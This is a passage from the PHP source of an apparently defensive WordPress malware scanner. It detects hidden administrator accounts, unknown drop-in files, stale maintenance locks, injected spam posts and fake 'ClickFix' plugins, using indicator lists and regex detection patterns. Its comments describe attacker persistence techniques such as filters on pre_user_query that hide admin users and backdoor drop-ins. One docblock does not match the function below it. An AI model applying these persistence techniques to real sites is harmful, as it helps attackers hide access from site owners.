	 * list should be conservative; the false-positive cost of flagging a
	 * benign hosting-provider tool is one extra finding for the operator to
	 * dismiss. The cost of NOT flagging a malicious file is a missed shell.
	 *
	 * @return array<string, true>
	 */
	private static function known_safe_root_php_extras(): array {
		return array_fill_keys( [
			'wp-config.php',      // user-generated WP configuration; not in manifest by design
			'wordfence-waf.php',  // Wordfence's auto_prepend_file target
		], true );
	}

	//  Renamed-readme detection (1.3.51) 
	//
	// WordPress core ships exactly one readme at ABSPATH: `readme.html`. Any
	// file matching `readme_<32-hex-chars>.html` is suspicious. Two scenarios
	// produce this filename pattern:
	//
	//   (a) Plesk WP Toolkit and some other hosting tools create hash-suffixed
	//       backups of WP files when running operations. These are benign
	//       hygiene artefacts but should be cleaned up after the operation
	//       completes; leaving them on disk is mild operational debt.
	//   (b) An attacker preserves the legitimate readme.html under a new name
	//       while doing something else with the original path  for example,
	//       replacing readme.html with a redirect or fingerprint-leak page.
	//       The hash-suffixed copy serves as a "look, it's still here"
	//       reassurance if the operator manually checks the readme path.
	//
	// In either case, the file warrants a finding so the operator can act.
	// Severity is `medium` (review-only) rather than `critical` because the
	// content is typically benign and the worst-case scenario is hygiene
	// debt. No `auto_delete`  the file might be a Plesk backup the operator
	// wants to keep until they confirm the operation completed.

	/**
	 * Scan ABSPATH root for files matching readme_<32hex>.html. The check is
	 * non-recursive  this exact pattern at ABSPATH root has no benign
	 * recursive equivalent, and adding subdirectory traversal would only
	 * raise false-positive rate for no detection benefit.
	 *
	 * @return array<int, array<string, string|bool>>
	 */
	private static function check_renamed_readme(): array {
		$found = [];
		$abspath_real = realpath( ABSPATH ) ?: rtrim( ABSPATH, '/\\' );
		try {
			$iter = new FilesystemIterator( $abspath_real, FilesystemIterator::SKIP_DOTS );
			foreach ( $iter as $f ) {
				if ( ! ( $f instanceof SplFileInfo ) || ! $f->isFile() ) continue;
				$name = $f->getFilename();
				if ( ! preg_match( '/^readme_[a-f0-9]{32}\.html$/i', $name ) ) continue;

				$found[] = [
					'severity' => 'medium',
					'type'     => 'WordPress readme.html with hash-style suffix at root',
					'subject'  => $name,
					'path'     => $f->getPathname(),
					'action'   => 'A file matching the pattern readme_<32-hex-chars>.html exists at WordPress root. '
						. 'WordPress core ships exactly one readme  readme.html, no suffix. '
						. 'The 32-hex suffix is the format Plesk WP Toolkit and similar hosting tools use when creating backup copies during file operations; it is also a "preserve the original under a new name" pattern attackers use when replacing the canonical readme.html with their own content. '
						. 'Inspect the file contents. If they match the canonical WordPress readme, the file is most likely a stale Plesk backup safe to delete. '
						. 'Then verify the canonical readme.html at root contains canonical WP content. If the canonical readme has been replaced with redirect HTML, fingerprint-leak content, or attacker text, restore from a clean WP install.',
				];
			}
		} catch ( \Exception $e ) {
			WPS_Logger::write( 'check_renamed_readme error: ' . $e->getMessage() );
		}
		return $found;
	}

	//  Stale .maintenance file check (1.3.48) 
	//
	// WordPress creates <ABSPATH>/.maintenance during core updates and
	// removes it when the update completes. While the file exists, every
	// front-end visitor sees "Briefly unavailable for scheduled
	// maintenance"  the site is effectively offline. A stale
	// .maintenance file (older than ~10 minutes) means either:
	//
	//   (a) A core update crashed and the cleanup never ran. Site is
	//       wedged; manual deletion of .maintenance unwedges it.
	//   (b) An attacker planted .maintenance to lock out users while
	//       installing a backdoor. The 503 response from the maintenance
	//       page hides whatever the attacker is doing on the back end.
	//
	// In either case, surfacing the stale file is the right move. Severity
	// escalates with age: 10-60 min = medium (probably a stuck update),
	// 1-24 hr = high, >24 hr = critical (no benign explanation at that age).
	// No auto-delete because the operator may want to verify a real update
	// is in progress before removing the lock file.

	const MAINTENANCE_STALE_THRESHOLD = 600;     // 10 minutes
	const MAINTENANCE_HIGH_THRESHOLD  = 3600;    // 1 hour
	const MAINTENANCE_CRITICAL_THRESHOLD = 86400; // 1 day

	/**
	 * Flag a stale .maintenance file at ABSPATH. Severity escalates with age.
	 *
	 * @return array<int, array<string, string|bool>>
	 */
	private static function check_maintenance_mode(): array {
		$found = [];
		$path = rtrim( ABSPATH, '/\\' ) . '/.maintenance';
		if ( ! is_file( $path ) ) return $found;

		$mtime = @filemtime( $path );
		if ( $mtime === false ) return $found;
		$age = time() - $mtime;
		if ( $age < self::MAINTENANCE_STALE_THRESHOLD ) return $found; // ongoing legitimate update

		// Severity escalation by age
		if ( $age >= self::MAINTENANCE_CRITICAL_THRESHOLD ) {
			$severity = 'critical';
			$age_label = floor( $age / 86400 ) . ' day(s)';
		} elseif ( $age >= self::MAINTENANCE_HIGH_THRESHOLD ) {
			$severity = 'high';
			$age_label = floor( $age / 3600 ) . ' hour(s)';
		} else {
			$severity = 'medium';
			$age_label = floor( $age / 60 ) . ' minute(s)';
		}

		$found[] = [
			'severity' => $severity,
			'type'     => 'Stale .maintenance file (site locked in maintenance mode)',
			'subject'  => '.maintenance present for ' . $age_label,
			'path'     => $path,
			'action'   => 'WordPress creates <ABSPATH>/.maintenance during core updates and removes it when the update completes. '
				. 'A .maintenance file persisting for ' . $age_label . ' indicates either a crashed update (manual deletion of '
				. '.maintenance restores the site) or an attacker locking out front-end traffic while modifying the back end. '
				. 'If no admin is currently running an update, delete the file via SSH: rm ' . $path . ' '
				. 'and run the full scan immediately afterwards to catch what was being staged behind the maintenance page.',
		];
		WPS_Logger::log_event(
			'maintenance_stale',
			'age=' . $age_label . ' severity=' . $severity
		);

		return $found;
	}

	//  Hidden admin user detection (1.3.52) 
	//
	// The user-audit logic in WPS_Forensics::trace_admin_accounts() uses
	// `get_users()`, which is the WordPress core API. The API respects every
	// active filter on `pre_user_query`, `users_list_query_args`, and related
	// hooks  including filters installed by malware specifically to hide
	// attacker-created admin accounts from `Users -> All Users` in the
	// dashboard. Hidden-user filters are a textbook persistence technique
	// often paired with the wp-security-cache.php family: the malware
	// creates the user via `wp_create_user()` (a normal DB row) and a
	// separate filter installer (in mu-plugins, theme `functions.php`, or
	// an active plugin) appends a WHERE clause to every user query
	// excluding the malicious user IDs. The result: the user can log in
	// and act as administrator, but is invisible to operator inspection.
	//
	// The fix is a check that queries the wp_users and wp_usermeta tables
	// directly via $wpdb, bypassing the filter chain entirely, and compares
	// the result against `get_users()`. Any count discrepancy is a hidden-
	// user signal even if the specific malware username does not match the
	// IoC list. The same direct walk also catches the wp-security-cache.php
	// email pattern `scan-<32hex>@<host>` as a forensic indicator that the
	// persistence layer ran on this site, regardless of whether the file
	// is still present on disk.
	//
	// No `auto_delete` on user findings  the operator MUST review user
	// records before deletion. wp-security-cache.php's "rotation" pattern
	// recreates the user even after deletion if the file is still active,
	// so the correct sequence is (1) confirm the file is gone, (2) verify
	// the finding via direct DB inspection, (3) `wp user delete` via WP-CLI
	// or the dashboard once the persistence chain is broken.

	/**
	 * Walk wp_users + wp_usermeta directly via $wpdb. Bypass get_users()
	 * filters. Flag (a) any admin user count discrepancy, (b) any user
	 * with a hardcoded malware-created username, (c) any user with the
	 * wp-security-cache.php email pattern.
	 *
	 * @return array<int, array<string, string|bool>>
	 */
	private static function check_hidden_admin_users(): array {
		global $wpdb;
		$found = [];

		if ( ! is_object( $wpdb ) || ! method_exists( $wpdb, 'get_results' ) ) return $found;

		$cap_meta_key = $wpdb->prefix . 'capabilities';

		// Direct-DB walk: every user with administrator role in their
		// capabilities meta. The LIKE pattern matches both singleton
		// `a:1:{s:13:"administrator";b:1;}` and multi-role rows.
		$rows = $wpdb->get_results( $wpdb->prepare(
			"SELECT u.ID, u.user_login, u.user_email, u.user_registered "
			. "FROM {$wpdb->users} u "
			. "INNER JOIN {$wpdb->usermeta} m ON m.user_id = u.ID "
			. "WHERE m.meta_key = %s AND m.meta_value LIKE %s "
			. "ORDER BY u.user_registered DESC",
			$cap_meta_key,
			'%"administrator"%'
		), ARRAY_A );
		if ( ! is_array( $rows ) ) return $found;

		// API count: what get_users() returns. Discrepancy = hidden user.
		$api_admin_ids = function_exists( 'get_users' )
			? get_users( [ 'role' => 'administrator', 'fields' => 'ID', 'number' => -1 ] )
			: [];
		if ( ! is_array( $api_admin_ids ) ) $api_admin_ids = [];
		$api_count_visible  = count( $api_admin_ids );
		$db_count_actual    = count( $rows );
		$api_id_set = array_fill_keys( array_map( 'intval', $api_admin_ids ), true );

		// Finding 1: admin count mismatch (filter-based hidden user).
		if ( $db_count_actual > $api_count_visible ) {
			$diff = $db_count_actual - $api_count_visible;
			// Identify which IDs are hidden, redact emails for log
			$hidden_logins = [];
			foreach ( $rows as $row ) {
				if ( ! isset( $api_id_set[ (int) $row['ID'] ] ) ) {
					$hidden_logins[] = $row['user_login'] . ' (ID=' . $row['ID'] . ')';
				}
			}
			$found[] = [
				'severity' => 'critical',
				'type'     => 'Hidden admin user(s)  direct-DB count differs from get_users()',
				'subject'  => $diff . ' admin user(s) hidden from get_users(): ' . implode( ', ', array_slice( $hidden_logins, 0, 5 ) ),
				'path'     => '',
				'action'   => 'A filter on pre_user_query or users_list_query_args is hiding ' . $diff . ' administrator user(s) from the WP dashboard and from get_users(). '
					. 'This is a textbook persistence technique paired with wp-security-cache.php and similar admin-user-creator malware. '
					. 'To find the filter installer, search active plugins, theme functions.php, and mu-plugins for: pre_user_query, users_list_query_args, or direct calls to add_filter() with user IDs in the closure body. '
					. 'To remove the user(s) once the filter is gone: WP-CLI `wp user delete <ID>` or the WP dashboard Users page (which will then show them). '
					. 'Do NOT delete via direct SQL until the filter source is removed  the dropper may recreate the user on next request.',
			];
			WPS_Logger::log_event( 'hidden_admin_user', 'count=' . $diff );
		}

		// Finding 2 + 3: walk every admin user (visible OR hidden) for
		// known malware username and known malware email pattern.
		$malware_logins = array_map( 'strtolower', WPS_Indicators::hardcoded_admin_usernames() );

		foreach ( $rows as $row ) {
			$login_lower = strtolower( (string) $row['user_login'] );
			$email_lower = strtolower( (string) $row['user_email'] );
			$is_hidden   = ! isset( $api_id_set[ (int) $row['ID'] ] );

			// Hardcoded malware username
			if ( in_array( $login_lower, $malware_logins, true ) ) {
				$found[] = [
					'severity' => 'critical',
					'type'     => 'Known malware-created admin user' . ( $is_hidden ? ' (hidden from get_users)' : '' ),
					'subject'  => 'user_login=' . $row['user_login'] . ' ID=' . $row['ID'] . ( $is_hidden ? ' [HIDDEN]' : '' ),
					'path'     => '',
					'action'   => 'This admin user was created by known malware (basename in WPS_Indicators::hardcoded_admin_usernames()). '
						. ( $is_hidden ? 'The user is hidden from get_users() by a filter; remove the filter installer first. ' : '' )
						. 'After removing any persistence layer (wp-security-cache.php and any pre_user_query filter), delete via WP-CLI `wp user delete ' . (int) $row['ID'] . '` or the dashboard Users page. '
						. 'Then run Hardening > Regenerate auth salts to invalidate any session this user holds.',
				];
				WPS_Logger::log_event( 'malware_username_in_db', 'login=' . $row['user_login'] . ' hidden=' . ( $is_hidden ? '1' : '0' ) );
				continue;
			}

			// Malware email pattern: scan-<32hex>@<host> from wp-security-cache.php
			if ( preg_match( '/^scan-[a-f0-9]{32}@/i', (string) $row['user_email'] ) ) {
				$found[] = [
					'severity' => 'critical',
					'type'     => 'Admin user with wp-security-cache.php email pattern (scan-<md5>@<host>)',
					'subject'  => 'user_login=' . $row['user_login'] . ' email=' . $row['user_email'] . ( $is_hidden ? ' [HIDDEN]' : '' ),
					'path'     => '',
					'action'   => 'This admin user has the deterministic email format `scan-<md5(NONCE_KEY)>@<site_host>` that wp-security-cache.php generates when creating its persistence admin. '
						. 'Even if the username has been rotated by the operator, the email pattern remains as a forensic indicator that the malware ran on this site. '
						. ( $is_hidden ? 'The user is hidden from get_users() by a filter; remove the filter installer first. ' : '' )
						. 'After removing any persistence layer, delete via WP-CLI `wp user delete ' . (int) $row['ID'] . '` or the dashboard Users page. Then run Hardening > Regenerate auth salts.',
				];
				WPS_Logger::log_event( 'malware_email_pattern_in_db', 'email=' . $row['user_email'] . ' hidden=' . ( $is_hidden ? '1' : '0' ) );
			}
		}

		return $found;
	}

	//  WordPress drop-in audit (1.3.54) 
	//
	// WordPress drop-ins are PHP files at canonical names under wp-content/
	// that load on every request before plugins initialise. They run earlier
	// than any security plugin can intercept, which makes them the highest-
	// privilege place a backdoor can live on a WordPress install. The
	// canonical drop-in set is small and well-known: object-cache.php,
	// advanced-cache.php, db.php, db-error.php, maintenance.php,
	// fatal-error-handler.php, install.php (under wp-content/, not wp-admin/),
	// php-error.php, and sunrise.php. Each has exactly one functional purpose
	// and is normally installed by a known caching, performance, or hosting
	// plugin (Performance Lab, W3 Total Cache, WP Super Cache, LiteSpeed,
	// Redis Object Cache, WP-Optimize, Plesk WP Toolkit, etc.).
	//
	// The existing 1.3.46 generic-webshell pattern scanner walks wp-content/
	// and would catch obvious shell shapes (`eval($_POST...)`, base64-decode
	// loops, etc.) at any drop-in path. It does not, however, have any
	// special awareness that drop-ins exist as a category, and it does not
	// flag a drop-in that uses original code to install a backdoor (e.g.,
	// add_filter('pre_user_query', ...) hook installer plus an authentication
	// bypass on a constructed cookie). The check below adds that awareness.
	// For each drop-in present at a canonical path, the contents are matched
	// against a list of signatures from known-safe publishers; drop-ins
	// matching one of the publishers are passed silently. Drop-ins matching
	// none of the publishers are flagged as `medium` severity, review-only.
	// No `auto_delete`: the operator may have installed a custom drop-in
	// deliberately (rare but valid), and the false-positive risk on a
	// less-common publisher justifies operator review.
	//
	// The known-safe-publisher signature list is maintained as a private
	// constant rather than a public IoC accessor because the list is purely
	// internal allowlist data, not threat intelligence.

	const DROP_IN_CANONICAL_NAMES = [
		'object-cache.php',
		'advanced-cache.php',
		'db.php',
		'db-error.php',
		'maintenance.php',
		'fatal-error-handler.php',
		'install.php',          // wp-content/install.php specifically; wp-admin/install.php is core
		'php-error.php',
		'sunrise.php',
	];

	/**
	 * Returns content signatures that uniquely identify a drop-in as
	 * coming from a known-safe publisher. Map of substring -> publisher
	 * label. The substrings are conservative: short enough to survive
	 * minor version changes but long enough that legitimate-non-publisher
	 * code is unlikely to contain them.
	 *
	 * @return array<string, string>
	 */
	private static function known_drop_in_publishers(): array {
		return [
			// Performance Lab plugin (object-cache.php drop-in for server-timing)
			'Object cache drop-in from Performance Lab plugin' => 'Performance Lab',
			'object-cache-plst-orig.php'                       => 'Performance Lab', // Performance Lab references its own backup file

			// Plesk WP Toolkit (auto-generated maintenance.php)
			'GENERATED AUTOMATICALLY'                          => 'Plesk WP Toolkit auto-generated drop-in',
			'Powered by WP Toolkit'                            => 'Plesk WP Toolkit auto-generated drop-in',

			// W3 Total Cache
			'W3 Total Cache'                                   => 'W3 Total Cache',
			'class W3_ObjectCache'                             => 'W3 Total Cache',
			'W3TC_DIR'                                         => 'W3 Total Cache',

			// WP Super Cache
			'WP Super Cache'                                   => 'WP Super Cache',
			'wpsupercache'                                     => 'WP Super Cache',
			'wp_cache_no_postid'                               => 'WP Super Cache',

			// LiteSpeed Cache
			'LiteSpeed_Cache'                                  => 'LiteSpeed Cache',
			'LSCWP_V'                                          => 'LiteSpeed Cache',
			'litespeed-cache'                                  => 'LiteSpeed Cache',

			// Redis Object Cache (Till Kruss)
			'Redis Object Cache'                               => 'Redis Object Cache',
			'WP_Redis'                                         => 'Redis Object Cache',
			'WP_REDIS_'                                        => 'Redis Object Cache',

			// WP-Optimize
			'WP-Optimize'                                      => 'WP-Optimize',
			'WPO_VERSION'                                      => 'WP-Optimize',
			'wpo_cache'                                        => 'WP-Optimize',

			// Memcached Object Cache (Ryan Boren / WordPress.com)
			'Memcached Object Cache'                           => 'Memcached Object Cache',

			// Batcache (WordPress.com)
			'class batcache'                                   => 'Batcache',
			'Batcache Manager'                                 => 'Batcache',

			// Hummingbird (WPMU DEV)
			'Hummingbird'                                      => 'Hummingbird Performance',
			'wphb-cache'                                       => 'Hummingbird Performance',

			// SG Optimizer (SiteGround)
			'SG Optimizer'                                     => 'SG Optimizer',
			'siteground-optimizer'                             => 'SG Optimizer',

			// Cloudflare APO
			'Cloudflare APO'                                   => 'Cloudflare APO',

			// Pantheon Advanced Page Cache
			'Pantheon'                                         => 'Pantheon',

			// WordPress core fatal-error-handler default
			'class WP_Fatal_Error_Handler'                     => 'WordPress core fatal-error-handler',
		];
	}

	/**
	 * Public accessor (1.3.71): canonical wp-content/ drop-in names, so the
	 * drop-in integrity guard reuses one source of truth instead of its own copy.
	 *
	 * @return list<string>
	 */
	public static function drop_in_canonical_names(): array {
		return self::DROP_IN_CANONICAL_NAMES;
	}

	/**
	 * Public accessor (1.3.71): return the known-safe publisher label whose
	 * signature appears in $contents, or '' if none. Reused by the drop-in
	 * integrity guard for severity classification.
	 */
	public static function match_drop_in_publisher( string $contents ): string {
		if ( $contents === '' ) {
			return '';
		}
		foreach ( self::known_drop_in_publishers() as $sig => $publisher ) {
			if ( strpos( $contents, $sig ) !== false ) {
				return (string) $publisher;
			}
		}
		return '';
	}

	/**
	 * Audit drop-ins at canonical wp-content/ paths against the known-safe
	 * publisher list. Flag any drop-in that does not match any publisher
	 * for operator review.
	 *
	 * @return array<int, array<string, string|bool>>
	 */
	private static function check_injected_spam_content(): array {
		global $wpdb;
		$found = [];
		if ( ! is_object( $wpdb ) || ! method_exists( $wpdb, 'get_results' ) || ! method_exists( $wpdb, 'prepare' ) ) {
			return $found;
		}
		if ( ! class_exists( 'WPS_Spam_Signatures' ) ) {
			return $found;
		}

		$terms = WPS_Spam_Signatures::like_prefilter_terms();
		$esc   = method_exists( $wpdb, 'esc_like' );

		// --- posts / pages ---
		$like = [];
		$args = [];
		foreach ( $terms as $t ) {
			$pat    = '%' . ( $esc ? $wpdb->esc_like( $t ) : $t ) . '%';
			$like[] = '(post_title LIKE %s OR post_content LIKE %s)';
			$args[] = $pat;
			$args[] = $pat;
		}
		$rows = $wpdb->get_results(
			$wpdb->prepare(
				"SELECT ID, post_title, post_content, post_status FROM {$wpdb->posts} "
				. "WHERE post_type IN ('post','page') AND ( " . implode( ' OR ', $like ) . " ) "
				. "ORDER BY post_date DESC LIMIT 500",
				$args
			),
			ARRAY_A
		);

		$hits     = [];
		$statuses = [];
		$signals  = [];
		foreach ( (array) $rows as $r ) {
			$eval = WPS_Spam_Signatures::evaluate( (string) ( $r['post_title'] ?? '' ) . "\n" . (string) ( $r['post_content'] ?? '' ) );
			if ( ! empty( $eval['spam'] ) ) {
				$hits[]          = (int) $r['ID'];
				$st              = (string) ( $r['post_status'] ?? 'unknown' );
				$statuses[ $st ] = ( $statuses[ $st ] ?? 0 ) + 1;
				$signals         = $signals ?: (array) $eval['signals'];
			}
		}

		if ( $hits ) {
			$breakdown = [];
			foreach ( $statuses as $st => $n ) {
				$breakdown[] = $n . ' ' . $st;
			}
			$found[] = [
				'severity' => count( $hits ) >= 5 ? 'critical' : 'high',
				'type'     => 'Injected gambling/SEO-spam posts',
				'subject'  => count( $hits ) . ' post(s) match injected casino/gambling spam signatures (' . implode( ', ', $breakdown ) . '); sample IDs: ' . implode( ', ', array_slice( $hits, 0, 10 ) ),
				'path'     => '',
				'action'   => 'These were almost certainly published by an injection, not by you. DO NOT just delete them - that does not close the entry point, and the injector will republish. First find the entry point: run a full scan, then check for a rogue administrator user, mu-plugins, PHP files under wp-content/uploads, and a modified theme functions.php. THEN remove the content (review each ID under Posts, including Trash and Scheduled), then harden. Signals seen: ' . implode( ', ', array_slice( $signals, 0, 5 ) ) . '.',
			];
			if ( class_exists( 'WPS_Logger' ) ) {
				WPS_Logger::log_event( 'injected_spam_content', 'posts=' . count( $hits ) . ' ids=' . implode( ',', array_slice( $hits, 0, 10 ) ) );
			}
		}

		// --- comments ---
		if ( ! empty( $wpdb->comments ) ) {
			$clike = [];
			$cargs = [];
			foreach ( $terms as $t ) {
				$cpat    = '%' . ( $esc ? $wpdb->esc_like( $t ) : $t ) . '%';
				$clike[] = 'comment_content LIKE %s';
				$cargs[] = $cpat;
			}
			$crows = $wpdb->get_results(
				$wpdb->prepare(
					"SELECT comment_ID, comment_content FROM {$wpdb->comments} "
					. "WHERE ( " . implode( ' OR ', $clike ) . " ) ORDER BY comment_date DESC LIMIT 500",
					$cargs
				),
				ARRAY_A
			);
			$chits = [];
			foreach ( (array) $crows as $r ) {
				$eval = WPS_Spam_Signatures::evaluate( (string) ( $r['comment_content'] ?? '' ) );
				if ( ! empty( $eval['spam'] ) ) {
					$chits[] = (int) $r['comment_ID'];
				}
			}
			if ( $chits ) {
				$found[] = [
					'severity' => 'high',
					'type'     => 'Injected gambling/SEO-spam comments',
					'subject'  => count( $chits ) . ' comment(s) match injected spam signatures; sample IDs: ' . implode( ', ', array_slice( $chits, 0, 10 ) ),
					'path'     => '',
					'action'   => 'Review and remove these comments, and confirm comment moderation and Akismet are active.',
				];
				if ( class_exists( 'WPS_Logger' ) ) {
					WPS_Logger::log_event( 'injected_spam_content', 'comments=' . count( $chits ) );
				}
			}
		}

		return $found;
	}

	private static function check_drop_ins(): array {
		$found = [];
		if ( ! defined( 'WP_CONTENT_DIR' ) ) return $found;
		$content_dir = rtrim( WP_CONTENT_DIR, '/\\' );
		if ( ! is_dir( $content_dir ) ) return $found;

		$publishers = self::known_drop_in_publishers();

		foreach ( self::DROP_IN_CANONICAL_NAMES as $name ) {
			$path = $content_dir . DIRECTORY_SEPARATOR . $name;
			if ( ! is_file( $path ) ) continue;

			$contents = @file_get_contents( $path );
			if ( ! is_string( $contents ) || $contents === '' ) continue;

			$matched_publisher = null;
			foreach ( $publishers as $sig => $publisher ) {
				if ( strpos( $contents, $sig ) !== false ) {
					$matched_publisher = $publisher;
					break;
				}
			}
			if ( $matched_publisher !== null ) continue; // legitimate

			// No publisher matched. Surface for operator review.
			$found[] = [
				'severity' => 'medium',
				'type'     => 'WordPress drop-in PHP from unknown publisher (high attack-surface location)',
				'subject'  => $name . ' at wp-content/',
				'path'     => $path,
				'action'   => 'A WordPress drop-in PHP file exists at wp-content/' . $name . ' that does not match any known caching, performance, or hosting publisher signature (Performance Lab, W3 Total Cache, WP Super Cache, LiteSpeed Cache, Redis Object Cache, WP-Optimize, Plesk WP Toolkit, Memcached Object Cache, Batcache, Hummingbird, SG Optimizer, Cloudflare APO, Pantheon). '
					. 'Drop-ins load on every request BEFORE plugins initialise, which makes them the highest-privilege location a backdoor can live in WordPress  they execute earlier than any security plugin can intercept. '
					. 'Inspect the file contents. If it is a custom drop-in you installed deliberately, this is a one-time review-and-acknowledge finding (the signature can be added to the known-safe publisher list via a code update). '
					. 'If you did not install it, treat as a backdoor candidate: drop-ins from unknown sources are an extremely common malware persistence vector. Verify before deletion  removing a legitimate cache drop-in will revert performance optimisations.',
			];
			WPS_Logger::log_event( 'unknown_drop_in', 'name=' . $name );
		}

		return $found;
	}

	//  Generic ClickFix-shape heuristic (1.3.58) 
	//
	// Per-prefix IoC entries (the slug blocklist + per-variant hash + per-variant
	// content signatures) catch known builds. Each new prefix that surfaces in
	// the wild requires a code update to add coverage. This is reactive: the
	// operator deploys a new variant, an operator captures a sample, the IoC
	// catalogue learns one more prefix. By the time 1.3.58 was written the
	// catalogue had grown to fourteen prefixes for a single malware family.
	//
	// The auto-content-profiler-0b8d sample captured on 2026-05-07 added a
	// further evasion: instead of concatenating string literals (which the
	// 1.3.39+ content-signature scanner caught at the literal-substring level),
	// the new variant builds the strings in variables. The hook name
	// `wp_footer` no longer appears in the file as a literal; it is assembled
	// at runtime from fragments. The dismiss-cookie names `_cf_verified` and
	// `_wp_perf_ok` are similarly fragmented. The content-signature scanner is
	// partially blind to this evasion.
	//
	// However, three things the malware CANNOT fragment: the plugin folder
	// slug (which must match the file basename for WordPress to load the
	// plugin), the class declaration (PHP requires `class FOO {` to be
	// literal), and the option key the malware reads/writes its config under
	// (10-hex literal in `update_option('wp_<10hex>_cfg', ...)`).
	//
	// This heuristic detects fake-plugin-folder shape rather than any
	// per-prefix or per-build string. Six structural traits are scored:
	//
	//   1. The plugin directory contains exactly one PHP file matching the
	//      `<slug>/<slug>.php` naming pattern, with no readme.txt, no
	//      LICENSE, no /assets/, no /vendor/, no /languages/. Real plugins
	//      almost always ship more than one file.
	//   2. File size is 5-15 KB. All ten captured ClickFix variants fall in
	//      this band; the upper bound rules out most legitimate plugins.
	//   3. The plugin header `Plugin URI:` points to
	//      `developer.wordpress.org/plugins/`. Real plugins point to their
	//      own homepage; the developer-docs root URI is a copy-paste tell.
	//   4. The file declares exactly one class with a name matching
	//      `[A-Z][A-Za-z_]+_[a-f0-9]{4,8}`. The hex suffix is the family
	//      naming convention (Opt_Handler_841e, Render_Module_5b7d,
	//      DB_Worker_1c49, etc.).
	//   5. The file contains a literal `wp_<10hex>_cfg` option key.
	//      Captured family naming convention; cannot be fragmented because
	//      the value passes through `update_option()` / `get_option()`
	//      which require the literal.
	//   6. The file contains an `add_action` registration with a numeric
	//      priority >= 50000. The family uses very late priorities (91411,
	//      91734, 98680) so its output cannot be filtered by the theme or
	//      other plugins. Legitimate code rarely uses priorities this high.
	//
	// Optional bonus trait (not required for scoring): the `Author:` field
	// matches one of the known shell-company names from the captured corpus.
	//
	// Severity:
	//   Score 5-6 -> high severity, auto_delete enabled (very high confidence)
	//   Score 4   -> high severity, review-only (no auto_delete  some
	//                legitimate niche plugins might score here)
	//   Score 3   -> medium severity, review-only
	//   Score < 3 -> no finding
	//
	// Walks `wp-content/plugins/` non-recursively at the top level. Skips
	// the plugin's own self-directory and the standard set of WP-bundled
	// plugins (akismet, hello.php). Each candidate folder is read once and
	// scored.

	/**
	 * Known shell-company / generic-team author names used by the ClickFix
	 * family. Acts as a bonus trait, not a primary scoring trait, because
	 * the operator can rotate these freely.
	 *
	 * @return list<string>
	 */
	private static function clickfix_known_shell_authors(): array {
		return [
			'Page Software',
			'Site Group',
			'Dev Group',
			'Cache Team',
			'Pro Team',
			'Performance Team',
			'Optimizer Team',
			'Web Optimizer',
			'WP Studio',
			// 1.3.68: captured-corpus additions from the 2026-05 sample batch.
			// Author values shown in the Plugin header of confirmed droppers.
			'Developer Tools Team', // wp-perf-analytics gen-1
			'Smart Software',       // native-render-toolkit-9401
			'Auto Labs',            // pro-font-optimizer-c88b
			'Auto Studio',          // site-speed-insights-d6e7
			'Pro Works',            // total-render-profiler-3753
			'Net IO',               // pro-cache-scanner-6d52
			'Cache Software',       // total-database-optimizer-9a95 (1.3.69)
			'Cache Solutions',      // site-security-toolkit-1f30 (1.3.79)
			'WP Solutions',         // auto-asset-helper-2763 (1.3.79)
		];
	}

	/**
	 * Plugin folder names that should never be flagged by the heuristic
	 * even if they happen to score. Prevents the scanner from flagging
	 * itself or known-good plugins.
	 *
	 * @return list<string>
	 */
	private static function clickfix_heuristic_allowlist(): array {
		return [
			'wp-perf-shield',
			'akismet',
			'hello.php', // single-file core plugin
		];
	}

	/**
	 * Score a candidate ClickFix-shaped plugin folder. Returns an integer
	 * in 0..6 where each point is one of the six structural traits.
	 *
	 * @param string $plugin_dir   Absolute path to the plugin folder.
	 * @param string $slug         Folder basename.
	 * @param string $main_php     Absolute path to the `<slug>.php` main file.
	 * @param int    $main_size    Size of the main file in bytes.
	 * @param string $contents     Contents of the main file.
	 * @return array{score:int, traits:array<int,string>, author_match:bool}
	 */
	private static function clickfix_score_candidate( string $plugin_dir, string $slug, string $main_php, int $main_size, string $contents ): array {
		$traits = [];

		// Trait 1: single-file shape (only the main PHP file, nothing else)
		$siblings = @scandir( $plugin_dir );
		if ( is_array( $siblings ) ) {
			$other = 0;
			foreach ( $siblings as $entry ) {
				if ( $entry === '.' || $entry === '..' ) continue;
				$full = $plugin_dir . DIRECTORY_SEPARATOR . $entry;
				if ( $full === $main_php ) continue;
				if ( $entry === 'index.php' && @filesize( $full ) < 200 ) continue; // typical placeholder
				$other++;
			}
			if ( $other === 0 ) $traits[] = 'single-file shape';
		}

		// Trait 2: file size 5KB-15KB
		if ( $main_size >= 5000 && $main_size <= 15000 ) {
			$traits[] = 'file size 5-15KB';
		}

		// Trait 3: Plugin URI -> developer.wordpress.org/plugins/
		if ( preg_match( '#Plugin URI:\s*https?://(?:www\.)?developer\.wordpress\.org/plugins/?\s#i', $contents ) ) {
			$traits[] = 'developer.wordpress.org/plugins/ Plugin URI';
		}

		// Trait 4: single class with [A-Z][A-Za-z_]+_[a-f0-9]{4,8} naming
		if ( preg_match_all( '/^\s*class\s+([A-Z][A-Za-z_]+_[a-f0-9]{4,8})\s*[\{a-zA-Z\s]/m', $contents, $cm ) ) {
			if ( count( $cm[1] ) === 1 ) {
				$traits[] = 'single hex-suffix class: ' . $cm[1][0];
			}
		}

		// Trait 5: wp_<10hex>_cfg option key literal
		if ( preg_match_all( '/wp_[a-f0-9]{10}_cfg/', $contents, $om ) ) {
			$traits[] = 'wp_<10hex>_cfg option literal: ' . $om[0][0];
		}

		// Trait 6: add_action with numeric priority >= 50000
		// The arg span uses [^;]*? (statement-bounded, non-greedy) rather than
		// [^)]+ so a callback in array($this,'method') form  whose inner ')'
		// previously terminated the match before the priority was reached  is
		// still scored. The total-database-optimizer-9a95 variant (1.3.69) used
		// exactly this array-callback shape to evade the older [^)]+ pattern.
		if ( preg_match( '/add_action\s*\([^;]*?,\s*[0-9]{5,}\s*[,)]/', $contents ) ) {
			$traits[] = 'late-priority add_action (>= 50000)';
		}

		// Bonus: known shell-company author. Doesn't add to score; recorded for
		// finding context.
		$author_match = false;
		if ( preg_match( '/Author:\s*(.+?)\s*[\r\n]/i', $contents, $am ) ) {
			$author = trim( $am[1] );
			foreach ( self::clickfix_known_shell_authors() as $known ) {
				if ( strcasecmp( $author, $known ) === 0 ) {
					$author_match = true;
					break;
				}
			}
		}

		return [
			'score'        => count( $traits ),
			'traits'       => $traits,
			'author_match' => $author_match,
		];
	}

	/**
	 * 1.3.89: Parse a wordpress.org plugin-checksums JSON body into
	 * relpath => [type, hashes]. Each file's hash may be a single string or an
	 * array (a whitelist of acceptable hashes for that named version, because
